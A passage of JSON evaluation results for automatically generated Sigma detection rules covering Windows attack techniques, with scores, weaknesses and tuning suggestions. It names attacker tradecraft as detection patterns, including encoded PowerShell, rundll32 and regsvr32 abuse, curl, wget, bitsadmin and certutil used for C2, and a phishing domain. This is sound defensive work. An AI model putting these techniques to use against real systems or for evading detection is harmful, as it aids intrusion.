          "accuracy": 0.2,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Malicious DLL Execution via Rundll32 or Regsvr32 for Persistence",
        "rule_id": "bb716978-9b3e-492a-b514-1115110ead50",
        "quality_score": 0.5,
        "status": "fail",
        "strengths": [
          "Clear, concise title and description describing the intended behavior.",
          "Uses Sysmon process creation events, which provide reliable process metadata.",
          "Simple, easy\u2011to\u2011read detection logic (selection1 OR selection2).",
          "Provides a list of expected false\u2011positive scenarios for analysts.",
          "Includes MITRE ATT&CK tagging and a high severity level."
        ],
        "weaknesses": [
          "Real\u2011world verification showed zero detections; the rule fails to capture the targeted persistence technique.",
          "Very generic \"CommandLine|contains: .dll\" condition leads to many legitimate rundll32/regsvr32 executions, increasing false positives.",
          "No allow\u2011list or context (e.g., parent process, signed status) to differentiate benign from malicious usage.",
          "Technique ID tag is incorrect (T1112 refers to Modify Registry, not DLL execution via rundll32/regsvr32).",
          "No handling for obfuscated or encoded command\u2011line arguments that attackers often use.",
          "Missing additional useful fields such as \"status\", \"references\", or \"date\" that aid rule management."
        ],
        "suggestions": [
          "Add more restrictive command\u2011line patterns (e.g., look for \"rundll32.exe .*\\.dll,.*\" or specific suspicious arguments).",
          "Include parent\u2011process filtering to ignore known legitimate callers (e.g., explorer.exe, svchost.exe).",
          "Implement an allow\u2011list of signed Microsoft binaries or known good DLL paths to reduce false positives.",
          "Correct the ATT&CK tag to the appropriate technique (e.g., T1117 \u2013 Regsvr32, or T1218 \u2013 Signed Binary Proxy Execution).",
          "Consider adding hash or signed\u2011status checks for the DLL being loaded, if available.",
          "Test the rule against a curated set of malicious samples and legitimate baseline traffic to fine\u2011tune thresholds.",
          "Document version, author, and reference links to improve maintainability and auditability."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "PowerShell Execution with Suspicious Command-Line Arguments",
        "rule_id": "c425467f-2955-4f40-bec4-cd4759e60ca2",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Clear and concise title and description describing the intent of the rule.",
          "Targets a well\u2011known technique (PowerShell execution) and uses MITRE ATT&CK tagging.",
          "Leverages Sysmon process creation events, which provide reliable data for command\u2011line monitoring.",
          "Provides a list of expected false positives to aid analysts in triage.",
          "Simple logical condition that is easy to understand and maintain."
        ],
        "weaknesses": [
          "The rule failed to detect any real\u2011world malicious activity (0 events), indicating poor detection coverage.",
          "Only looks for \"-enc\" and the literal string \"Invoke-Expression\"; many malicious PowerShell invocations use other flags (e.g., \"-EncodedCommand\", \"-Command\", base64 payloads) and will be missed.",
          "Does not include the newer PowerShell executable name \"pwsh.exe\", limiting coverage of PowerShell Core usage.",
          "Potentially high false\u2011positive rate because legitimate admin scripts and management tools frequently use \"-enc\" or Invoke\u2011Expression.",
          "No exclusions or allow\u2011list logic to reduce noise from known good tools (e.g., SCCM, Intune).",
          "The rule does not employ regex or pattern matching to detect base64\u2011encoded strings, which are common in malicious PowerShell commands.",
          "Missing explicit field for rule status or versioning that some SIEM platforms expect."
        ],
        "suggestions": [
          "Add detection for additional PowerShell command\u2011line flags such as \"-EncodedCommand\", \"-Command\", and \"-File\" that are often abused.",
          "Include a regex pattern to identify base64\u2011encoded payloads (e.g., strings of length >= 100 characters consisting of A\u2011Z, a\u2011z, 0\u20119, +, /, =).",
          "Expand the image selection to also cover \"pwsh.exe\" for PowerShell Core environments.",
          "Implement allow\u2011list exclusions for known legitimate tools (SCCM, Intune, Windows Update, security agents) to reduce false positives.",
          "Consider using a more specific condition that combines the presence of suspicious flags with indicators of obfuscation (e.g., presence of \"FromBase64String\").",
          "Test the rule against a representative dataset of benign and malicious PowerShell activity and adjust thresholds accordingly.",
          "Document rule version, author, and last reviewed date to improve maintainability and compliance with governance processes."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.4
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Spearphishing Attachment with Malicious PDF Targeting Colombian Entities",
        "rule_id": "534edaf4-d2d6-43cf-8a77-0f8ecb0d83b8",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Provides concrete IOCs (specific PDF hash, exact malicious PDF filename, known malicious email addresses).",
          "Covers multiple execution vectors (AcroRd32.exe, Office spawning cmd/powershell, Outlook command line).",
          "Uses Sysmon process creation events, which are high\u2011fidelity and widely available on Windows endpoints.",
          "Includes a detailed false\u2011positive description and assigns a high severity level.",
          "Tags the rule with ATT&CK technique identifiers for easy mapping."
        ],
        "weaknesses": [
          "The rule failed to detect any real\u2011world events; detection coverage is very low.",
          "Selectors are overly specific (exact PDF name, exact email addresses), causing many false negatives for variants of the attack.",
          "The selector `Image|endswith\": \".pdf\"` is conceptually wrong because the Image field contains the process executable path, not a document file; this condition will never match.",
          "Reliance on exact email addresses may miss compromised accounts using different addresses.",
          "No generic detection of PDF execution (e.g., any AcroRd32.exe opening a PDF) or of Office processes launching shells with suspicious arguments.",
          "The rule does not incorporate file\u2011creation or file\u2011modification events that could capture malicious PDFs before execution."
        ],
        "suggestions": [
          "Add a generic selector for AcroRd32.exe opening any PDF (e.g., `Image|endswith\": \"\\AcroRd32.exe\"` and `CommandLine|contains\": \".pdf\"`).",
          "Replace the invalid `Image|endswith\": \".pdf\"` selector with a file\u2011monitoring rule (e.g., using the `file_creation` or `file_change` logsource).",
          "Broaden Outlook detection to look for suspicious attachment names or known malicious domains rather than exact email addresses.",
          "Include detection of Office processes launching cmd/powershell with suspicious command\u2011line arguments (e.g., `-EncodedCommand`, `-ExecutionPolicy Bypass`).",
          "Incorporate a hash\u2011based file\u2011monitoring rule that triggers on known malicious PDF hashes regardless of the process that opens them.",
          "Validate the rule against a test dataset of known spearphishing attachment samples to ensure it fires as expected.",
          "Add references, author, and creation date fields to improve documentation and maintainability."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Office Document Spawning Command Shells (Phishing)",
        "rule_id": "9a284703-b9fe-4718-9931-0eee5d50b473",
        "quality_score": 0.5,
        "status": "fail",
        "strengths": [
          "Clear, concise description of the intended malicious behavior.",
          "Uses a specific parent\u2011child relationship (WINWORD.EXE \u2192 cmd.exe / powershell.exe) which is easy to understand.",
          "Includes a rule for detecting PowerShell encoded commands, a common indicator of malicious macros.",
          "Provides a list of plausible false\u2011positive scenarios to aid analysts.",
          "Leverages Sysmon process creation events, which are reliable and low\u2011noise."
        ],
        "weaknesses": [
          "The rule failed to detect any real\u2011world events (0 events found), indicating poor detection coverage for the targeted technique.",
          "Only targets WINWORD.EXE; legitimate macro activity can also originate from EXCEL.EXE, POWERPNT.EXE, or other Office binaries.",
          "Does not consider other command\u2011line interpreters commonly used by macros (e.g., wscript.exe, cscript.exe, mshta.exe).",
          "High likelihood of false positives in environments where administrators or power users routinely launch scripts from Office documents.",
          "No additional context (e.g., EventID, User, CommandLine patterns beyond -EncodedCommand) to help triage alerts.",
          "No evidence of field name mismatches, but the verification failure suggests possible schema or naming issues in the SIEM implementation."
        ],
        "suggestions": [
          "Broaden the parent image filter to include other Office executables (EXCEL.EXE, POWERPNT.EXE, etc.).",
          "Add detections for additional child processes such as wscript.exe, cscript.exe, mshta.exe, and rundll32.exe that are also used by malicious macros.",
          "Incorporate more granular CommandLine patterns (e.g., \"-ExecutionPolicy Bypass\", \"-NoProfile\", or typical macro\u2011generated PowerShell arguments).",
          "Combine the parent\u2011child condition with user or session context (e.g., exclude known admin accounts or service accounts) to reduce false positives.",
          "Validate that the field names used (Image, ParentImage, CommandLine) exactly match the Sysmon schema in the target SIEM; adjust if necessary.",
          "Test the rule against a curated set of benign and malicious Office macro samples to fine\u2011tune thresholds and verify detection capability.",
          "Consider adding a time\u2011window or correlation with other indicators (e.g., suspicious Office file creation, network connections to known C2) to increase confidence."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Suspicious PowerShell Execution with Encoded or Network Commands",
        "rule_id": "9284c9ba-50c1-4b1d-bfea-2d25b49b9cb6",
        "quality_score": 0.475,
        "status": "fail",
        "strengths": [
          "Targets a high\u2011risk execution environment (PowerShell) with multiple relevant indicators (encoded commands, network cmdlets).",
          "Provides a clear false\u2011positive description to aid analysts in triage.",
          "Includes ATT&CK tags and technique identifiers for mapping.",
          "Uses Sysmon process creation logs, which are reliable for process\u2011level detection."
        ],
        "weaknesses": [
          "Real\u2011world verification shows the rule failed to detect any events, indicating poor detection coverage.",
          "High likelihood of false positives from legitimate admin scripts, SCCM, Windows Update, and monitoring tools.",
          "Does not cover alternative PowerShell binaries (e.g., pwsh.exe) or scripts that invoke PowerShell via `powershell -Command` without the `-enc` flag.",
          "Relies solely on simple string containment; may miss encoded commands that use base64 without the explicit `-enc` flag or use different casing.",
          "No exclusion criteria (e.g., known benign parent processes) to reduce noise.",
          "Potential performance impact if the SIEM does not index the CommandLine field efficiently."
        ],
        "suggestions": [
          "Add detection for the newer PowerShell Core executable (`pwsh.exe`) and for PowerShell invoked via `powershell -Command` without `-enc`.",
          "Incorporate a regular\u2011expression check for base64 strings (e.g., `CommandLine|regex: \"[A-Za-z0-9+/]{100,}={0,2}\"`) to catch encoded payloads that omit the flag.",
          "Introduce exclusion rules for known legitimate parent processes (e.g., `svchost.exe`, `Msiexec.exe`) or specific signed scripts to lower false positives.",
          "Normalize case\u2011insensitive matching for command\u2011line keywords (e.g., use `contains|ci`).",
          "Consider adding a condition for `Invoke-Expression` (`IEX`) only when combined with suspicious payload patterns to avoid noisy alerts.",
          "Validate the query syntax against the target SIEM (e.g., ensure the `|contains` operator is supported) and test with synthetic events to confirm detection works.",
          "Document any required field indexing (e.g., ensure `CommandLine` is indexed) to improve query performance."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Execution of PowerShell or CMD with Known Phishing URL",
        "rule_id": "1c0cd537-6e95-48da-8f76-e99dd4b2af99",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Clear, concise title and description that explain the intent of the rule.",
          "Targets multiple execution vectors (PowerShell, cmd.exe, and winword.exe) to broaden coverage of the specific phishing domain.",
          "Uses Sysmon process_creation events, which provide reliable command\u2011line visibility.",
          "Provides a detailed false\u2011positive list to aid analysts in triage.",
          "Includes useful metadata (tags, technique name, generation method, unique ID)."
        ],
        "weaknesses": [
          "Hard\u2011coded domain (\"dian.server.tl\") makes the rule extremely narrow; it will miss variants, sub\u2011domains, or other phishing URLs used for the same technique.",
          "Real\u2011world verification showed zero detections, indicating the rule does not match the observed data (possible field name mismatch or command\u2011line truncation).",
          "No MITRE ATT&CK technique ID is provided (\"attack.t1566\" is a tactic, not a technique ID), reducing integration with ATT&CK mapping.",
          "Potential for false positives when legitimate scripts or updates legitimately download from the domain.",
          "Does not handle encoded or obfuscated command lines (e.g., PowerShell -EncodedCommand) that could hide the URL.",
          "Relies solely on command\u2011line content; does not consider network\u2011connection logs that could capture the same URL usage."
        ],
        "suggestions": [
          "Replace the single hard\u2011coded domain with a threat\u2011intel list or a regex that matches the domain and its sub\u2011domains.",
          "Add detection for PowerShell's \"-EncodedCommand\" and other obfuscation techniques that could conceal the URL.",
          "Include network\u2011connection events (e.g., Sysmon NetworkConnect) to catch the URL even when the command line is truncated or encoded.",
          "Validate and align field names with the SIEM schema (e.g., ensure \"Image\" and \"ParentImage\" are the correct fields for process name).",
          "Provide the proper MITRE ATT&CK technique ID (e.g., T1566.001 for Phishing: Spearphishing Link) to improve mapping and reporting.",
          "Test the rule against a representative dataset of known malicious and benign events to fine\u2011tune thresholds and reduce false positives.",
          "Consider adding a confidence or severity scoring field based on the presence of additional indicators (e.g., suspicious arguments, unusual parent\u2011child relationships)."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Suspicious Creation of Critical System Process",
        "rule_id": "b22d048e-99e5-42a6-8dfd-d3f876152063",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Clear, concise title and description that explain the intent of the rule.",
          "Targets a well\u2011known MITRE technique (T1543.003 \u2013 Create or Modify System Process).",
          "Uses Sysmon process creation events, which provide reliable process metadata.",
          "Provides a list of expected false positives to aid analysts.",
          "Includes useful MITRE tags for mapping to tactics/techniques."
        ],
        "weaknesses": [
          "The rule failed to detect any real\u2011world instances of the technique (0 events), indicating poor detection coverage.",
          "High likelihood of false positives because legitimate administrative actions (service restarts, updates, maintenance scripts) also match the criteria.",
          "Only checks the parent image; attackers can spawn critical processes from non\u2011shell parents, which this rule would miss.",
          "The rule does not exclude known good activity (e.g., scheduled tasks, Windows Update) leading to noise.",
          "The `ttp_id` field is set to \"unknown\", reducing traceability to the MITRE ATT&CK framework.",
          "No explicit Sysmon EventID filter (e.g., EventID 1) which could improve query efficiency and accuracy.",
          "Generation method \"langchain\" is irrelevant to detection and may cause confusion."
        ],
        "suggestions": [
          "Add an explicit filter for Sysmon EventID 1 (process creation) to ensure only relevant events are evaluated.",
          "Incorporate additional context such as `CommandLine` or `ImageLoaded` to differentiate legitimate service launches from malicious ones.",
          "Introduce exclusions for known benign activities (e.g., Windows Update, scheduled task executions, admin\u2011initiated service restarts).",
          "Consider expanding the parent process list to include other common attacker\u2011controlled launchers (e.g., wscript.exe, mshta.exe) while still maintaining low noise.",
          "Replace the placeholder `ttp_id` with the correct ATT&CK technique ID (T1543.003) for better mapping.",
          "Add a condition to check for unusual command\u2011line arguments or unsigned binaries when launching critical system processes.",
          "Test the rule against a labeled dataset of malicious activity to tune thresholds and reduce false positives.",
          "Document the rule version, creation date, and author to improve maintainability."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "User Execution of Potentially Malicious Processes via Explorer",
        "rule_id": "0d19eed9-bd0c-4b3b-85da-5a9511781131",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Clear and concise title and description that map to ATT&CK technique T1204.",
          "Uses Sysmon process_creation events with explicit ParentImage and Image fields, which are reliable sources.",
          "Provides a list of expected false positives to aid analysts in tuning.",
          "Includes useful metadata such as tags, technique name, generation method, and SIEM verification block."
        ],
        "weaknesses": [
          "Very limited detection scope \u2013 only five specific executables launched from explorer, missing many other user\u2011execution vectors (e.g., .lnk files, scripts, PowerShell ISE, etc.).",
          "High likelihood of false positives because PowerShell, cmd.exe, wscript.exe, mshta.exe and rundll32.exe are frequently launched from Explorer for legitimate administration tasks.",
          "Verification result shows zero detections, indicating the rule does not capture the intended attack in practice.",
          "Missing broader context such as command\u2011line arguments, hash or reputation checks, and path exclusions that could reduce noise.",
          "The \"ttp_id\" field is set to \"unknown\" and the tactic field is empty, which reduces completeness of ATT&CK mapping."
        ],
        "suggestions": [
          "Expand the rule to include additional parent processes (e.g., explorer.exe launching .lnk, .vbs, .js, .ps1 files) and other common user\u2011execution binaries.",
          "Add command\u2011line filtering to look for suspicious arguments (e.g., \"-EncodedCommand\", \"-ExecutionPolicy Bypass\", or script URLs).",
          "Incorporate allow\u2011list exclusions for known benign paths (e.g., Windows system directories, trusted admin tools).",
          "Consider using reputation data (hashes, signed binaries) to differentiate legitimate from malicious executions.",
          "Update ATT&CK mapping fields with proper technique ID and tactic (e.g., \"t1204\" and \"execution\").",
          "Validate the rule against a labeled dataset of benign and malicious events to fine\u2011tune thresholds and reduce false positives.",
          "If possible, add a secondary condition that checks for unusual process trees (e.g., explorer \u2192 powershell \u2192 suspicious child) to improve coverage."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Create or Modify System Process Persistence via Command-line Tools",
        "rule_id": "2517cafb-0fd3-4184-bdf2-1af5dfca1148",
        "quality_score": 0.725,
        "status": "pass",
        "strengths": [
          "Covers multiple common persistence mechanisms (services, scheduled tasks, COM registration, WMIC).",
          "Leverages Sysmon process creation events, which provide detailed command\u2011line data.",
          "Verification against real SIEM data succeeded (4 events detected in 550\u202fms).",
          "Explicit false\u2011positive documentation for each sub\u2011selection.",
          "Simple, readable condition using \"1 of selection_*\"."
        ],
        "weaknesses": [
          "High potential for false positives because the rule matches any use of sc.exe, regsvr32.exe, powershell.exe -enc, schtasks.exe, or wmic.exe with generic string contains.",
          "No contextual enrichment (e.g., parent process, user context, privilege level) to differentiate legitimate admin activity from malicious use.",
          "String\u2011contains matching may trigger on benign commands that merely contain the keywords (e.g., \"create\" in a comment).",
          "Missing precise MITRE ATT&CK technique ID (uses generic \"attack.t1543\" tag instead of the official ID).",
          "Rule appears auto\u2011generated (generation_method: \"langchain\"), which may indicate lack of manual tuning."
        ],
        "suggestions": [
          "Add contextual filters such as requiring the process to run under a non\u2011administrative account or checking the parent process (e.g., cmd.exe, powershell.exe).",
          "Replace generic \"contains\" checks with more specific regex patterns that match the exact syntax of service creation, task creation, or COM registration commands.",
          "Implement a whitelist of known legitimate automation tools (e.g., SCCM, Ansible) or approved service\u2011creation scripts to reduce noise.",
          "Include the official MITRE ATT&CK technique ID (e.g., T1543.003 for Windows Service) in the tags for better mapping.",
          "Consider adding a secondary condition that looks for suspicious arguments (e.g., \"-enc\" combined with a long base64 string) to improve signal\u2011to\u2011noise ratio.",
          "Document versioning and change history for the rule to aid future maintenance."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.9,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Execution of cmd.exe with command flag",
        "rule_id": "36665c17-962e-408c-9905-ff3616811a11",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Clear, concise title and description linking to ATT&CK technique.",
          "Uses Sysmon process creation events, which provide detailed command line data.",
          "Provides a list of expected false positives to aid analysts.",
          "Includes useful tags for categorization and searching.",
          "All required Sigma fields are present (title, description, logsource, detection, falsepositives, level, tags, id)."
        ],
        "weaknesses": [
          "Detection only matches \"cmd.exe\" with the \"/c\" flag, missing other legitimate command flags such as \"/k\" or variations (e.g., \"cmd /c\", \"cmd.exe /c\").",
          "High likelihood of false positives because many legitimate administrative scripts and scheduled tasks invoke cmd.exe with \"/c\".",
          "Verification in the real SIEM returned zero detections, indicating the rule does not capture the observed malicious activity.",
          "No exclusions or allow\u2011list logic for known benign processes (e.g., Windows Update, installer processes).",
          "ATT&CK identifiers are marked as \"unknown\" instead of the proper technique ID (T1059).",
          "No use of more precise matching (e.g., regex) to avoid partial matches or to capture quoted command lines."
        ],
        "suggestions": [
          "Expand the detection to include both \"/c\" and \"/k\" flags, and consider using a regex that captures any cmd.exe invocation with command\u2011execution flags.",
          "Add allow\u2011list conditions for known legitimate processes or scheduled tasks that routinely use cmd.exe.",
          "Incorporate the correct ATT&CK technique ID (T1059) in the \"tags\" and \"technique_name\" fields.",
          "Consider adding a parent\u2011process filter (e.g., exclude svchost.exe, services.exe) to reduce noise.",
          "Test the rule against a representative dataset of both benign and malicious cmd.exe usage to fine\u2011tune thresholds and reduce false positives.",
          "If possible, enrich the rule with additional context such as the user account, event ID, or hash of the cmd.exe binary to improve confidence."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Execution of Scripting Interpreters",
        "rule_id": "271595a1-0007-412f-9076-c7201cdf1450",
        "quality_score": 0.48,
        "status": "fail",
        "strengths": [
          "Covers multiple common scripting interpreters (PowerShell, wscript, cscript, python, cmd).",
          "Uses Sysmon process creation events, which provide detailed process information.",
          "Provides a clear description and includes a false\u2011positive mitigation note.",
          "Includes ATT&CK tagging (attack.t1059) and other metadata (title, id, generation_method)."
        ],
        "weaknesses": [
          "Failed to detect any real\u2011world malicious events; detection coverage is poor.",
          "Very broad condition leads to a high false\u2011positive rate (any execution of the listed interpreters).",
          "No contextual filters (e.g., parent process, user, known benign paths) to reduce noise.",
          "Only cmd.exe is partially filtered (requires \"/c\"), while PowerShell, Python, etc., have no command\u2011line constraints.",
          "ATT&CK technique ID is missing (\"ttp_id\": \"unknown\"), reducing mapping clarity.",
          "Rule appears auto\u2011generated (generation_method: \"langchain\") without validation against actual data.",
          "No explicit Sysmon Event ID filter (e.g., EventID 1) which could improve performance."
        ],
        "suggestions": [
          "Add contextual exclusions such as known legitimate script locations (e.g., C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe) or trusted service accounts.",
          "Incorporate command\u2011line patterns that indicate suspicious usage (e.g., PowerShell \"-EncodedCommand\", \"-ExecutionPolicy Bypass\", Python \"-c\", etc.).",
          "Filter on Sysmon Event ID 1 to limit the query to process\u2011creation events only.",
          "Include parent\u2011process or originating process criteria to focus on unexpected interpreter launches (e.g., launched from explorer.exe, not from known admin tools).",
          "Replace the generic \"or\" condition with a more granular approach that assigns severity based on the interpreter and command\u2011line content.",
          "Populate the proper ATT&CK technique ID (e.g., T1059.001 for PowerShell) to improve mapping and reporting.",
          "Test the rule against a representative dataset of benign and malicious activity to fine\u2011tune thresholds and reduce false positives.",
          "Consider adding a time\u2011window or aggregation (e.g., multiple interpreter launches within a short period) to highlight anomalous behavior."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detect Use of Scripting Interpreters",
        "rule_id": "e9dc1166-6f65-4b7d-bff9-235897364345",
        "quality_score": 0.475,
        "status": "fail",
        "strengths": [
          "Leverages Sysmon process creation events, which are reliable and detailed.",
          "Specifies a concrete detection for PowerShell with the '-enc' flag, targeting a common malicious pattern.",
          "Provides a clear list of expected false positives, aiding analysts in triage.",
          "Includes MITRE ATT&CK tags and technique name for mapping."
        ],
        "weaknesses": [
          "Failed to detect any real\u2011world instances of the Scripting technique (0 events found).",
          "Very broad matching for cscript.exe, wscript.exe, and python.exe without command\u2011line filters, leading to high false\u2011positive potential.",
          "Does not cover other common interpreter binaries (e.g., pwsh.exe, pythonw.exe, bash.exe, etc.).",
          "PowerShell detection is limited to the '-enc' flag, missing many malicious PowerShell executions that omit it.",
          "Missing optional but useful metadata fields such as author, creation date, references, and version.",
          "No allow\u2011list or context\u2011aware exclusions to reduce noise from legitimate administrative scripts."
        ],
        "suggestions": [
          "Expand PowerShell detection to include executions without '-enc' but with other suspicious indicators (e.g., '-Command', '-EncodedCommand', remote script download, or use of Invoke\u2011Expression).",
          "Add command\u2011line pattern matching for cscript/wscript/python (e.g., scripts located in temporary directories, use of '-ExecutionPolicy Bypass', or known malicious script names).",
          "Include additional interpreter binaries such as pwsh.exe, pythonw.exe, bash.exe, and any custom script hosts used in the environment.",
          "Implement an allow\u2011list for known legitimate scheduled tasks, build pipelines, and administrative scripts to reduce false positives.",
          "Add missing metadata fields (author, date, version, references) to improve rule documentation and maintenance.",
          "Validate the rule against a curated dataset of benign and malicious script executions to fine\u2011tune thresholds and reduce noise."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.6,
          "efficiency": 0.8,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Suspicious Process Injection via Common Windows Utilities",
        "rule_id": "5b800ef7-abe7-4926-96f9-dd2976fbbbbf",
        "quality_score": 0.45,
        "status": "fail",
        "strengths": [
          "Targets well\u2011known Windows utilities (rundll32, powershell, regsvr32) that are frequently abused for process injection.",
          "Provides explicit false\u2011positive descriptions to aid analysts in triage.",
          "Leverages Sysmon process\u2011creation events, which are rich in detail and commonly available.",
          "Uses a clear, simple OR condition that is easy to understand and maintain."
        ],
        "weaknesses": [
          "The rule failed to detect any real\u2011world injection activity (0 events), indicating poor detection coverage.",
          "High likelihood of false positives because the selected utilities are also used in many legitimate administrative tasks.",
          "Only looks for a narrow set of command\u2011line flags (e.g., \"-enc\", \".dll\", \"/i\"); many injection techniques do not use these flags.",
          "Parent\u2011child relationship check is limited to Explorer \u2192 PowerShell, missing other common spawn patterns (e.g., services, scheduled tasks).",
          "Missing MITRE ATT&CK tactic field and a concrete ATT&CK technique ID (\"unknown\"), reducing integration with threat\u2011modeling frameworks.",
          "No correlation with Sysmon EventID 8 (CreateRemoteThread) or other direct injection indicators, limiting the rule\u2019s ability to catch stealthier injections."
        ],
        "suggestions": [
          "Add detection of Sysmon EventID 8 (CreateRemoteThread) and EventID 7 (ImageLoad) to capture direct injection behavior.",
          "Broaden command\u2011line patterns to include other PowerShell obfuscation flags (e.g., \"-EncodedCommand\", \"-e\"), and consider looking for base64 strings.",
          "Include additional parent\u2011process checks (e.g., services.exe, svchost.exe, taskeng.exe) and allow for non\u2011Explorer launchers.",
          "Introduce exclusions or allow\u2011lists for known benign scripts and software installers to reduce false positives.",
          "Replace the placeholder \"unknown\" ATT&CK IDs with the correct technique ID (T1055) and add the corresponding tactic (Execution / Defense Evasion).",
          "Consider using regex or fuzzy matching for DLL names and PowerShell payloads to catch variations while still limiting noise.",
          "Validate the rule against a curated dataset of both malicious injection samples and legitimate administrative activity to fine\u2011tune thresholds."
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.7,
          "efficiency": 0.6,
          "maintainability": 0.3
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Suspicious Application Layer Protocol Usage via Command Line",
        "rule_id": "5bc18ad4-95ed-4940-a535-bcf86933ff56",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
          "Covers several common command\u2011line utilities used for application\u2011layer C2 (PowerShell, curl, wget, bitsadmin, python).",
          "Leverages Sysmon process_creation logs, which provide reliable process details.",
          "Provides explicit false\u2011positive guidance for each selection.",
          "Verification data shows the rule successfully detected 60 events with a sub\u2011second query time.",
          "Clear, concise condition using OR logic makes the rule easy to understand and maintain."
        ],
        "weaknesses": [
          "High likelihood of false positives because the selected patterns (e.g., \"-EncodedCommand\", \"http\") are also used in legitimate administrative scripts and software updates.",
          "Limited to a small set of executables; other common C2 tools (certutil, bitsadmin with different flags, PowerShell without -EncodedCommand, PowerShell IEX, etc.) are not covered.",
          "The \"http\" substring is overly broad and may match benign URLs, increasing noise.",
          "No contextual enrichment (e.g., correlating with network connections, process parentage, or execution frequency) to reduce alerts.",
          "Tags include a generic MITRE ID (attack.t1071) but lack the specific technique sub\u2011ID (e.g., T1071.001) and do not reference the official ATT&CK ID field.",
          "Missing optional metadata such as \"author\", \"date\", or \"status\" that can aid rule lifecycle management."
        ],
        "suggestions": [
          "Refine PowerShell detection: add regex for Base64 strings of a minimum length, look for suspicious cmdlet usage (e.g., Invoke\u2011Expression, IEX, Invoke\u2011WebRequest).",
          "Introduce whitelisting: exclude known good paths or signed binaries that regularly use these flags.",
          "Expand the rule to include other common C2 utilities (certutil, bitsadmin with different parameters, PowerShell without -EncodedCommand but with \"-Command\" containing URLs, etc.).",
          "Replace the generic \"http\" substring with a more precise URL pattern (e.g., regex for \"http[s]?://[^\"]+\"), or require the presence of a domain/IP that is not in an allow\u2011list.",
          "Add a secondary condition that checks for outbound network connections (e.g., Sysmon EventID 3) from the same process to corroborate suspicious activity.",
          "Incorporate rate\u2011limiting or aggregation logic to alert only when multiple matches occur within a short time window from the same host or user.",
          "Update tags to include the exact ATT&CK sub\u2011technique ID (e.g., \"attack.t1071.001\") and add the official \"attack_id\" field.",
          "Document rule author, creation date, and version to improve governance and future updates."
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Suspicious Command-Line Interpreter Execution Detected",
        "rule_id": "29874848-eafc-49fb-ac4b-6af9db99faed",
        "quality_score": 0.5,
        "status": "fail",
        "strengths": [
          "Covers multiple common command-line interpreters (PowerShell, cmd.exe, wscript.exe, cscript.exe, python.exe).",
          "Uses explicit file name matching (Image|endswith) which is efficient for indexing.",
          "Provides a detailed false\u2011positive description to aid analysts.",
          "Includes SIEM verification metadata (query time, status).",
          "Tags the rule with ATT&CK technique identifiers."
        ],
        "weaknesses": [
          "The rule failed to detect any events in the real\u2011world verification, indicating poor detection coverage for the intended technique.",
          "Broad flag matching (e.g., \"/c\", \"-c\", \".js\") will generate many benign alerts, leading to a high false\u2011positive rate.",
          "No specific malicious indicators (e.g., Base64 strings, download URLs, suspicious script content) are included, limiting the rule's ability to differentiate legitimate from malicious usage.",
          "The rule does not restrict the context (e.g., user account, parent process, network activity), which further increases noise.",
          "Missing explicit MITRE ATT&CK ID (ttp_id is \"unknown\") and other optional metadata such as author or version.",
          "No handling of PowerShell encoded commands beyond the presence of \"-EncodedCommand\" or \"-enc\"; it does not validate that the argument is actually a Base64 payload."
        ],
        "suggestions": [
          "Add pattern matching for Base64\u2011encoded strings after \"-EncodedCommand\" (e.g., regex for long Base64 strings) to focus on truly suspicious PowerShell usage.",
          "Refine the cmd.exe detection to look for known malicious command patterns (e.g., \"Invoke\u2011Expression\", \"certutil\", \"bitsadmin\") rather than any \"/c\" usage.",
          "Include additional conditions that correlate the process launch with network activity (e.g., outbound connections to suspicious domains) or with known malicious parent processes.",
